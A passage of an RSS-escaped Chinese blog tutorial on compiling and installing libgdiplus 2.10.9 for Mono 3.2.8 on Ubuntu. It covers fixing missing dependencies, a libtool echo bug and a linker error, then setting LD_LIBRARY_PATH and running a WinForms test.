&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libglib2.0-dev libpcre3-dev libpcrecpp0 zlib1g-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The following packages will be upgraded:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libglib2.0-0 libglib2.0-bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">2&lt;/span> upgraded, &lt;span class="m">4&lt;/span> newly installed, &lt;span class="m">0&lt;/span> to remove and &lt;span class="m">273&lt;/span> not upgraded.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Need to get 2,728 kB of archives.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">After this operation, 9,208 kB of additional disk space will be used.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Do you want to &lt;span class="k">continue&lt;/span> &lt;span class="o">[&lt;/span>Y/n&lt;span class="o">]&lt;/span>?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>重新初始化libgdiplus安装配置文件：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix&lt;span class="o">=&lt;/span>/opt/mono-3.2.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> libpng14... checking &lt;span class="k">for&lt;/span> libpng12... no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> png_read_info in -lpng... no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">configure: error: *** libpng12 not found. See http://www.libpng.org/pub/png/libpng.html.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>又遇到错误了，需要安装libpng-dev：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libpng-dev
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>重新初始化libgdiplus安装配置文件：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix&lt;span class="o">=&lt;/span>/opt/mono-3.2.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./configure: line 13371: test: too many arguments
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">configure: error: &lt;span class="s2">&amp;#34;Failed to compile with X11/Xlib.h include. You must fix your compiler paths&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>提示错误，需要安装libx11-dev：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libx11-dev
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>重新初始化libgdiplus安装配置文件：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix&lt;span class="o">=&lt;/span>/opt/mono-3.2.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">configure: error: Cairo requires at least one font backend.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Please install freetype and fontconfig, &lt;span class="k">then&lt;/span> try again:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://freetype.org/ http://fontconfig.org/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">configure: error: ./configure failed &lt;span class="k">for&lt;/span> cairo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>需要安装freetype和fontconfig：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libfreetype6-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install fontconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libfontconfig1-dev
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>重新初始化libgdiplus安装配置文件：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix&lt;span class="o">=&lt;/span>/opt/mono-3.2.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Configuration summary
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">* Installation &lt;span class="nv">prefix&lt;/span> &lt;span class="o">=&lt;/span> /opt/mono-3.2.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">* &lt;span class="nv">Cairo&lt;/span> &lt;span class="o">=&lt;/span> 1.6.4 &lt;span class="o">(&lt;/span>internal&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">* &lt;span class="nv">Text&lt;/span> &lt;span class="o">=&lt;/span> cairo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">* EXIF &lt;span class="nv">tags&lt;/span> &lt;span class="o">=&lt;/span> No. Get it from http://libexif.sourceforge.net/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">* Codecs supported:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- TIFF: no &lt;span class="o">(&lt;/span>Get it from http://www.libtiff.org/&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- JPEG: no &lt;span class="o">(&lt;/span>Get it from http://freshmeat.net/projects/libjpeg&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- GIF: no &lt;span class="o">(&lt;/span>See http://sourceforge.net/projects/libgif&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- PNG: yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NOTE: &lt;span class="k">if&lt;/span> any of the above say &lt;span class="s1">&amp;#39;no&amp;#39;&lt;/span> you may install the
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">corresponding development packages &lt;span class="k">for&lt;/span> them, rerun
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">autogen.sh to include them in the build.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>./configure通过。&lt;/p>
&lt;h2 id="002编译安装源代码">0×02编译安装源代码
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ make
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make all-recursive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>: Entering directory &lt;span class="sb">`&lt;/span>/home/nike/src/libgdiplus-2.10.9&lt;span class="s1">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Making all in pixman
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">make[2]: Entering directory `/home/nike/src/libgdiplus-2.10.9/pixman&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make all-recursive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make&lt;span class="o">[&lt;/span>3&lt;span class="o">]&lt;/span>: Entering directory &lt;span class="sb">`&lt;/span>/home/nike/src/libgdiplus-2.10.9/pixman&lt;span class="s1">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Making all in pixman
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">make[4]: Entering directory `/home/nike/src/libgdiplus-2.10.9/pixman/pixman&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/bash ../libtool --tag&lt;span class="o">=&lt;/span>CC --mode&lt;span class="o">=&lt;/span>compile gcc -DHAVE_CONFIG_H -I. -I.. -g -O2 -Wall -fvisibility&lt;span class="o">=&lt;/span>hidden -MT pixman-access.lo -MD -MP -MF .deps/pixman-access.Tpo -c -o pixman-access.lo pixman-access.c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">../libtool: line 852: X--tag&lt;span class="o">=&lt;/span>CC: &lt;span class="nb">command&lt;/span> not found
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>遇到错误了，通过google搜索，可能是因为在项目目录下生成的libtool脚本中定义了&lt;code>$ECHO&lt;/code>变量，但是在脚本文件ltmain.sh中，使用的却是&lt;code>$echo&lt;/code>（生成的libtool版本太旧）&lt;/p>
&lt;p>解决方法很简单&lt;code>export echo=echo&lt;/code>即可：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ &lt;span class="nb">export&lt;/span> &lt;span class="nv">echo&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">echo&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ &lt;span class="nv">make&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>: Entering directory &lt;span class="sb">`&lt;/span>/home/nike/src/libgdiplus-2.10.9/tests&lt;span class="s1">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">/bin/bash ../libtool --tag=CC --mode=link gcc -g -O2 -pthread -o testgdi testgdi.o ../src/libgdiplus.la -lpthread -lfontconfig
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">libtool: link: gcc -g -O2 -pthread -o .libs/testgdi testgdi.o ../src/.libs/libgdiplus.so -lpthread -lfontconfig -pthread -Wl,-rpath -Wl,/opt/mono-3.2.8/lib
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">/usr/bin/ld: testgdi.o: undefined reference to symbol &amp;#39;&lt;/span>g_print&lt;span class="s1">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">/lib/i386-linux-gnu/libglib-2.0.so.0: error adding symbols: DSO missing from command line
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">collect2: error: ld returned 1 exit status
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">make[2]: *** [testgdi] Error 1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">make[2]: Leaving directory `/home/nike/src/libgdiplus-2.10.9/tests&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>: *** &lt;span class="o">[&lt;/span>all-recursive&lt;span class="o">]&lt;/span> Error &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>: Leaving directory &lt;span class="sb">`&lt;/span>/home/nike/src/libgdiplus-2.10.9&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make: *** &lt;span class="o">[&lt;/span>all&lt;span class="o">]&lt;/span> Error &lt;span class="m">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>编译时又出错了，解决办法为：&lt;/p>
&lt;p>1.运行&lt;code>./configure&lt;/code>后，编辑&lt;code>tests/Makefile&lt;/code>文件&lt;/p>
&lt;p>2.在Makefile文件130行位置，将&lt;code>LIBS = -lpthread -lfontconfig&lt;/code>改为&lt;code>LIBS = -lpthread -lfontconfig -lglib-2.0 -lX11&lt;/code>&lt;/p>
&lt;p>3.再次运行&lt;code>make&lt;/code>即可&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ vim tests/Makefile
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ &lt;span class="nv">make&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;编译很快&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo make &lt;span class="nv">install&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>安装完成。&lt;/p>
&lt;h2 id="003设置path环境变量">0×03设置PATH环境变量
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/mono-3.2.8$ &lt;span class="nb">cd&lt;/span> ~
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ vim .bashrc
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在该文件末尾追加以下语句：&lt;/p>
&lt;p>&lt;code>export LD_LIBRARY_PATH=/opt/mono-3.2.8/lib&lt;/code>&lt;/p>
&lt;p>然后：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ . .bashrc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ &lt;span class="nb">echo&lt;/span> &lt;span class="nv">$LD_LIBRARY_PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/opt/mono-3.2.8/lib
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="004验证libgdiplus是否安装成功">0×04验证libgdiplus是否安装成功
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ &lt;span class="nb">cd&lt;/span> Desktop/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/Desktop$ mono FormsTest.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.keepwn.com/images/mono-in-ubuntu-formtest.webp#center"
loading="lazy"
alt="mono in ubuntu"
>&lt;/p>
&lt;p>运行成功。&lt;/p></description></item></channel></rss>